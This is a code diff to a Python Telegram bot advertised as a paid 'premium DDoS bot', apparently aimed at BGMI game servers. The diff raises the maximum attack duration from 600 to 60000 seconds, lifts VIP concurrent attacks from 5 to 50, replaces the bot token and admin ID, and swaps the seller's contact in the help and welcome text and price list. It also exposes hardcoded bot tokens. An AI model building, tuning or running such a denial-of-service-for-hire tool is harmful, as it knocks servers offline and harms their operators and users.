@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7259034553:AAHYWdbEpMxeJAkv_HH1QYOChdMLMvot13E')
+bot = telebot.TeleBot('7756332729:AAHZVb8Qz6HNMSTWbU7rQFIso7SCSbZ32jY')
 
 # Admin user IDs
-admin_id = ["5588464519"]
+admin_id = ["6626992947"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -307,8 +307,8 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 600:
-                response = "Error: Time interval must be less than 600."
+            if time > 60000:
+                response = "Error: Time interval must be less than 60000."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
@@ -357,7 +357,7 @@ def show_help(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-Buy From :- @venomXcrazy
+Buy From :- @TanmayOfficialBGMI
 Official Channel :- https://t.me/V3NOM_CH3AT
 '''
     for handler in bot.message_handlers:
@@ -375,7 +375,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
 🤖Try To Run This Command : /help 
-✅BUY :- @venomXcrazy'''
+✅BUY :- @TanmayOfficialBGMI'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -397,7 +397,7 @@ def welcome_plan(message):
 Vip 🌟 :
 -> Attack Time : 300 (S)
 > After Attack Limit : 10 sec
--> Concurrents Attack : 5
+-> Concurrents Attack : 50
 
 Pr-ice List💸 :
 Day-->80 Rs
